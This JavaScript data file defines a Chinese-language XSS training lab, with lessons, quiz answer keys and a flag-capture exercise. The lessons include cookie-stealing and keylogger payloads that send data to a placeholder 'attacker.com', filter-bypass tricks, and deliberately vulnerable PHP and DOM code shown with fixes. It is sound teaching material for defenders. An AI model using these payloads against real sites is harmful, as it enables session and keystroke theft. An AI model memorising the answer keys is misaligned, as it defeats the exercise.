// XSS跨站脚本攻击实验模拟数据
export const XSSExperiment = {
  id: 2,
  name: 'XSS跨站脚本攻击实验',
  introduction: '本实验将帮助你理解XSS跨站脚本攻击的原理、分类和防御方法',
  difficulty: 2,
  taskPoints: [
    {
      id: 1,
      name: 'XSS基础概念',
      description: '学习XSS跨站脚本攻击的基本概念和分类',
      score: 5,
      document:
        '## XSS基础概念\n\nXSS（Cross-Site Scripting，跨站脚本攻击）是一种常见的Web应用安全漏洞，攻击者通过在网页中注入恶意脚本代码，当用户访问该页面时，脚本被执行，从而达到窃取用户信息或者执行特定操作的目的。\n\n### XSS攻击的分类\n\n1. **反射型XSS（Reflected XSS）**\n   - 非持久化，需要用户点击特制的链接\n   - 恶意代码存在URL参数中，服务器解析后返回给用户\n   - 例如：`http://example.com/search?q=<script>alert(\'XSS\')</script>`\n\n2. **存储型XSS（Stored XSS）**\n   - 持久化，恶意代码被存储在服务器中\n   - 任何访问包含恶意代码页面的用户都会受到攻击\n   - 常见于论坛帖子、评论系统等用户可输入内容的地方\n\n3. **DOM型XSS（DOM-based XSS）**\n   - 基于文档对象模型的攻击\n   - 恶意代码不经过服务器，而是通过前端JavaScript执行\n   - 攻击发生在客户端，与服务器响应无关\n\n### XSS攻击的危害\n\n- 窃取用户Cookie和会话信息\n- 获取敏感数据（如表单输入内容）\n- 进行钓鱼攻击\n- 执行任意JavaScript代码\n- 可能导致CSRF攻击\n\n了解XSS的基本概念和分类是防御此类攻击的第一步。',
      questions: [
        {
          id: 1,
          content: 'XSS攻击的全称是什么？',
          score: 2,
          requiresTarget: false,
          type: 'multiple-choice',
          options: ['Cross-Site Scripting', 'Cross-Server Security', 'Cross-Site Security', 'Client-Side Scripting'],
          answer: [0] // Cross-Site Scripting
        },
        {
          id: 2,
          content: '以下哪种XSS攻击类型的恶意代码会被存储在服务器中？',
          score: 3,
          requiresTarget: false,
          type: 'multiple-choice',
          options: ['反射型XSS', '存储型XSS', 'DOM型XSS', '以上都不是'],
          answer: [1] // 存储型XSS
        }
      ]
    },
    {
      id: 2,
      name: 'XSS攻击载荷',
      description: '学习常见的XSS攻击载荷（payload）及其工作原理',
      score: 7,
      document:
        '## XSS攻击载荷\n\nXSS攻击载荷（payload）是指在XSS攻击中用来执行特定功能的恶意JavaScript代码。了解常见的攻击载荷有助于识别潜在的威胁并进行防御。\n\n### 基本测试载荷\n\n最简单的XSS测试载荷用于验证漏洞是否存在：\n\n```javascript\n<script>alert(\'XSS\')</script>\n```\n\n### Cookie窃取载荷\n\n用于窃取用户Cookie的载荷示例：\n\n```javascript\n<script>\n  var img = new Image();\n  img.src = "https://attacker.com/steal?cookie=" + document.cookie;\n</script>\n```\n\n### 键盘记录载荷\n\n用于记录用户键盘输入的载荷：\n\n```javascript\n<script>\n  var keys = \'\';\n  document.onkeypress = function(e) {\n    keys += e.key;\n    new Image().src = "https://attacker.com/log?keys=" + keys;\n  }\n</script>\n```\n\n### 绕过过滤的技巧\n\n当网站对输入进行过滤时，攻击者可能使用各种技巧绕过防御：\n\n1. **使用HTML编码**\n   ```html\n   &lt;script&gt;alert(\'XSS\')&lt;/script&gt;\n   ```\n\n2. **使用不同的标签和事件**\n   ```html\n   <img src="x" onerror="alert(\'XSS\')">\n   <body onload="alert(\'XSS\')">\n   ```\n\n3. **使用JavaScript伪协议**\n   ```html\n   <a href="javascript:alert(\'XSS\')">点击我</a>\n   ```\n\n4. **使用CSS表达式**（旧版IE浏览器）\n   ```html\n   <div style="background-image:expression(alert(\'XSS\'))">\n   ```\n\n了解这些载荷类型有助于开发人员识别代码中的潜在漏洞，并采取适当的防御措施。',
      questions: [
        {
          id: 1,
          content: '以下哪个是最常用的XSS测试载荷？',
          score: 3,
          requiresTarget: false,
          type: 'multiple-choice',
          options: ['<script>alert(\'XSS\')</script>', '<body>XSS</body>', '<img src="xss.jpg">', '<a href="xss.html">XSS</a>'],
          answer: [0] // <script>alert('XSS')</script>
        },
        {
          id: 2,
          content: '攻击者可以通过XSS攻击获取用户的什么信息？',
          score: 4,
          requiresTarget: false,
          type: 'multiple-choice',
          options: ['操作系统版本', 'Cookie和会话信息', '硬盘序列号', 'BIOS密码'],
          answer: [1] // Cookie和会话信息
        }
      ]
    },
    {
      id: 3,
      name: 'XSS漏洞识别',
      description: '学习识别网页中可能存在的XSS漏洞',
      score: 8,
      document:
        '## XSS漏洞识别\n\n识别网页中可能存在的XSS漏洞是安全测试的重要环节。以下是一些常见的识别方法：\n\n### 常见的XSS漏洞位置\n\n1. **URL参数**\n   - 查询参数直接显示在页面上的位置\n   - 例如：搜索结果、错误消息等\n\n2. **表单输入**\n   - 评论框、留言板、用户资料等用户输入内容的地方\n   - 尤其是这些内容会被显示给其他用户的情况\n\n3. **HTTP头**\n   - User-Agent、Referer等HTTP头中的数据被网页使用并显示\n\n4. **文件上传功能**\n   - 允许上传HTML、SVG等可以包含脚本的文件类型\n\n### 测试方法\n\n1. **黑盒测试**\n   - 在各个输入点尝试注入简单的XSS载荷\n   - 观察网页响应，检查是否成功执行\n\n2. **灰盒测试**\n   - 结合源代码审查和黑盒测试\n   - 分析数据流，找出从输入到输出未经过滤的路径\n\n3. **自动化扫描**\n   - 使用OWASP ZAP、Burp Suite等工具进行自动扫描\n   - 针对发现的可能漏洞进行手动验证\n\n### 漏洞验证\n\n验证XSS漏洞时，可使用无害的payload，如：\n\n```javascript\n<script>alert(document.domain)</script>\n```\n\n如果弹出当前域名的对话框，则证明存在XSS漏洞。请记住，未经授权在他人网站上进行此类测试是违法的，应仅在获得授权的环境中进行测试。',
      questions: [
        {
          id: 1,
          content: '以下哪个位置最可能存在XSS漏洞？',
          score: 4,
          requiresTarget: false,
          type: 'multiple-choice',
          options: ['静态HTML页面', '用户评论区', '图片文件', 'CSS样式表'],
          answer: [1] // 用户评论区
        },
        {
          id: 2,
          content: '验证XSS漏洞的常用方法是？',
          score: 4,
          requiresTarget: false,
          type: 'multiple-choice',
          options: ['使用SQL注入', '尝试DOS攻击', '注入弹出对话框的JavaScript代码', '上传病毒文件'],
          answer: [2] // 注入弹出对话框的JavaScript代码
        }
      ]
    },
    {
      id: 4,
      name: 'XSS防御技术',
      description: '学习防御XSS攻击的主要技术和最佳实践',
      score: 10,
      document:
        '## XSS防御技术\n\n防御XSS攻击需要采取多层次的安全措施。以下是一些主要的防御技术和最佳实践：\n\n### 输入验证和过滤\n\n1. **白名单验证**\n   - 只允许预先定义的安全字符和格式\n   - 例如：只允许字母、数字和有限的标点符号\n\n2. **输入消毒（Sanitization）**\n   - 移除或转义潜在危险的字符和代码\n   - 使用专门的库进行处理，如DOMPurify\n\n```javascript\n// 使用DOMPurify库进行HTML消毒\nconst clean = DOMPurify.sanitize(userInput);\n```\n\n### 输出编码\n\n1. **HTML编码**\n   - 将特殊字符转换为HTML实体\n   - 例如：`<` 转换为 `&lt;`，`>` 转换为 `&gt;`\n\n2. **JavaScript编码**\n   - 在JavaScript中正确编码用户数据\n   - 使用`JSON.stringify()`等方法处理数据\n\n3. **URL编码**\n   - 对URL参数进行编码\n   - 使用`encodeURIComponent()`函数\n\n```javascript\n// HTML编码示例\nfunction htmlEncode(str) {\n  return String(str)\n    .replace(/&/g, \'&amp;\')\n    .replace(/</g, \'&lt;\')\n    .replace(/>/g, \'&gt;\')\n    .replace(/"/g, \'&quot;\')\n    .replace(/\'/g, \'&#39;\');\n}\n```\n\n### 内容安全策略（CSP）\n\nCSP是一种额外的安全层，通过HTTP头部限制浏览器可以加载和执行的资源：\n\n```http\nContent-Security-Policy: default-src \'self\'; script-src \'self\' trusted-cdn.com;\n```\n\n这个策略限制页面只能从自身域和trusted-cdn.com加载脚本。\n\n### 其他防御措施\n\n1. **设置Cookie属性**\n   - 使用HttpOnly标志防止JavaScript访问Cookie\n   - 使用Secure标志确保Cookie只通过HTTPS传输\n\n2. **X-XSS-Protection头**\n   - 激活浏览器内置的XSS过滤器\n   ```http\n   X-XSS-Protection: 1; mode=block\n   ```\n\n3. **框架和库**\n   - 使用现代Web框架（如React、Angular、Vue）\n   - 这些框架通常默认转义输出\n\n4. **定期安全审计**\n   - 代码审查和渗透测试\n   - 使用自动化工具扫描XSS漏洞\n\n综合应用这些防御技术，可以有效降低XSS攻击的风险。记住，安全不是一个单一的解决方案，而是需要多层次防御策略。',
      questions: [
        {
          id: 1,
          content: 'XSS防御的最佳实践是什么？',
          score: 5,
          requiresTarget: false,
          type: 'multiple-choice',
          options: ['禁用所有JavaScript功能', '只信任来自可靠来源的输入', '对用户输入进行验证和输出编码', '完全禁止用户输入'],
          answer: [1, 2] // 只信任来自可靠来源的输入, 对用户输入进行验证和输出编码
        },
        {
          id: 2,
          content: '内容安全策略（CSP）的主要作用是什么？',
          score: 5,
          requiresTarget: false,
          type: 'multiple-choice',
          options: ['限制浏览器加载和执行资源的来源', '加密所有网络流量', '验证用户身份', '保护数据库免受注入攻击'],
          answer: [0] // 限制浏览器加载和执行资源的来源
        }
      ]
    },
    {
      id: 5,
      name: 'XSS实例分析',
      description: '通过真实案例分析XSS攻击的过程和防御',
      score: 10,
      document:
        '## XSS实例分析\n\n通过分析真实的XSS攻击案例，我们可以更好地理解攻击的过程、影响及防御方法。以下是一些典型案例：\n\n### 案例一：反射型XSS攻击\n\n**漏洞代码：**\n```php\n<?php\n// search.php\n$query = $_GET[\'query\'];\necho "<div>搜索结果: " . $query . "</div>";\n?>\n```\n\n**攻击URL：**\n```\nhttp://example.com/search.php?query=<script>document.location=\'http://attacker.com/steal.php?cookie=\'+document.cookie</script>\n```\n\n**攻击过程：**\n1. 攻击者构造包含恶意脚本的URL\n2. 诱导用户点击链接\n3. 用户点击后，服务器将恶意代码嵌入响应页面\n4. 浏览器执行脚本，将用户Cookie发送到攻击者的服务器\n\n**防御方法：**\n```php\n<?php\n$query = htmlspecialchars($_GET[\'query\'], ENT_QUOTES, \'UTF-8\');\necho "<div>搜索结果: " . $query . "</div>";\n?>\n```\n\n### 案例二：存储型XSS攻击\n\n**漏洞代码：**\n```php\n<?php\n// save_comment.php\n$comment = $_POST[\'comment\'];\n$db->query("INSERT INTO comments (content) VALUES (\'$comment\')");\n\n// view_comments.php\n$result = $db->query("SELECT content FROM comments");\nwhile($row = $result->fetch_assoc()) {\n  echo "<div>" . $row[\'content\'] . "</div>";\n}\n?>\n```\n\n**攻击载荷：**\n```html\n<script>\nvar xhr = new XMLHttpRequest();\nxhr.open(\'GET\', \'http://attacker.com/steal?data=\'+document.cookie, true);\nxhr.send();\n</script>\n```\n\n**攻击过程：**\n1. 攻击者在评论中提交恶意脚本\n2. 脚本被存储在数据库中\n3. 任何访问评论页面的用户都会执行该脚本\n4. 所有用户的Cookie都会被发送到攻击者的服务器\n\n**防御方法：**\n```php\n<?php\n// 保存前过滤\n$comment = htmlspecialchars($_POST[\'comment\'], ENT_QUOTES, \'UTF-8\');\n$db->query("INSERT INTO comments (content) VALUES (\'$comment\')");\n\n// 或者在显示时过滤（如果需要在数据库中保存原始格式）\nwhile($row = $result->fetch_assoc()) {\n  echo "<div>" . htmlspecialchars($row[\'content\'], ENT_QUOTES, \'UTF-8\') . "</div>";\n}\n?>\n```\n\n### 案例三：DOM型XSS攻击\n\n**漏洞代码：**\n```html\n<script>\nfunction showMessage() {\n  var message = location.hash.substring(1);\n  document.getElementById(\'output\').innerHTML = message;\n}\n</script>\n<body onload="showMessage()">\n  <div id="output"></div>\n</body>\n```\n\n**攻击URL：**\n```\nhttp://example.com/page.html#<img src=x onerror="alert(document.cookie)">\n```\n\n**攻击过程：**\n1. 攻击者构造特殊的URL并诱导用户访问\n2. JavaScript代码直接将URL中的片段写入DOM\n3. 恶意代码在用户浏览器中执行\n\n**防御方法：**\n```html\n<script>\nfunction showMessage() {\n  var message = location.hash.substring(1);\n  // 使用textContent而不是innerHTML\n  document.getElementById(\'output\').textContent = message;\n}\n</script>\n```\n\n### 关键防御总结\n\n1. **永远不要信任用户输入**\n2. **根据上下文采用适当的编码/转义方法**\n3. **输入验证和输出编码双管齐下**\n4. **使用内容安全策略（CSP）作为额外防线**\n5. **定期进行安全审计和测试**\n\n通过研究这些案例，可以看出XSS攻击的多样性和防御的复杂性。在实际开发中，推荐使用经过验证的安全库和框架，而不是自己实现安全功能。',
      questions: [
        {
          id: 1,
          content: '在存储型XSS攻击中，恶意代码存储在哪里？',
          score: 5,
          requiresTarget: false,
          type: 'multiple-choice',
          options: ['用户的Cookie中', '浏览器缓存中', '服务器数据库中', '网络路由器中'],
          answer: [2] // 服务器数据库中
        },
        {
          id: 2,
          content: '以下哪个是防御DOM型XSS攻击的有效方法？',
          score: 5,
          requiresTarget: false,
          type: 'multiple-choice',
          options: ['使用innerHTML插入内容', '使用eval()处理用户输入', '使用textContent而不是innerHTML', '禁用所有JavaScript'],
          answer: [2] // 使用textContent而不是innerHTML
        }
      ]
    },
    {
      id: 6,
      name: 'XSS实验环境',
      description: '在靶机环境中实践XSS攻击的识别和利用',
      score: 10,
      document: `# XSS实验环境

## 实验简介

本实验环境提供了一个简单的留言板系统，你将在这个环境中学习如何识别XSS漏洞，并尝试构造特定的输入来验证漏洞的存在。

**注意：本实验环境仅用于教育目的。** 所有操作都在受控环境中进行，这些技术在未经授权的情况下使用是违法的。

## 实验目标

1. 理解XSS漏洞的原理
2. 学习如何识别易受XSS攻击的输入点
3. 掌握构造XSS payload的基本技术
4. 了解XSS漏洞的防御方法

## 实验环境说明

实验环境包含：
- 一个简单的留言板页面
- 留言提交功能
- 留言展示功能
- 一个隐藏的flag值

## 实验步骤

### 第一步：熟悉环境

1. 观察留言板的基本功能
2. 尝试提交普通文本留言
3. 观察留言如何显示在页面上

### 第二步：探测漏洞

1. 尝试在留言中插入简单的HTML标签（如\`<b>粗体文本</b>\`）
2. 观察页面是否正确解析并显示HTML标签
3. 如果HTML标签被正确解析，这表明输入可能没有被适当过滤

### 第三步：验证XSS漏洞

1. 提交一个基本的XSS测试代码：\`<script>alert('XSS')</script>\`
2. 观察是否出现弹窗，验证XSS漏洞的存在
3. 如果弹窗成功显示，说明确实存在XSS漏洞

### 第四步：获取flag

系统中隐藏了一个flag值，通过XSS漏洞尝试获取它：

1. 查看页面源代码，寻找隐藏的元素或JavaScript变量
2. 构造能够读取并显示该flag的XSS payload
3. 提交payload并获取flag值

## 实验小贴士

- 如果简单的\`<script>\`标签被过滤，尝试其他方式触发JavaScript，如\`<img src="x" onerror="alert('XSS')">\`
- 有时候需要查看页面源代码才能发现隐藏的信息
- 不同的上下文可能需要不同的XSS payload
- 实际攻击场景中，攻击者通常将窃取的数据发送到他们控制的服务器

## 实验评分标准

实验评分基于以下几个方面：
1. 成功识别XSS漏洞（3分）
2. 成功构造有效的XSS payload（3分）
3. 成功获取flag（4分）

## 安全提醒

请记住：
- XSS攻击在实际网站上未经授权是违法的
- 负责任地披露发现的漏洞
- 将所学知识用于构建更安全的应用程序

现在，开始你的实验吧！`,
      questions: [
        {
          id: 1,
          content: '请描述XSS攻击的基本原理 (在本前端模拟实验的上下文中)',
          score: 3,
          requiresTarget: false,
          type: 'open-ended-without-answer'
        },
        {
          id: 2,
          content: "以下哪个payload可以成功触发XSS弹窗？",
          score: 3,
          requiresTarget: false,
          type: 'single-choice',
          options: ["<script>alert('XSS')</script>", '<b>Bold Text</b>', '&lt;script&gt;alert(\'XSS\')&lt;/script&gt;', 'javascript:alert(\'XSS\')'],
          answer: 0 // <script>alert('XSS')</script>
        },
        {
          id: 3,
          content: '请使用恰当的XSS payload获取页面中隐藏的flag值。请写出你使用的payload和获取的flag值。',
          score: 4,
          requiresTarget: false,
          type: 'open-ended-with-answer'
        }
      ]
    }
  ],
  targetMachine: {
    id: '550e8400-e29b-41d4-a716-446655440001'
  }
}; 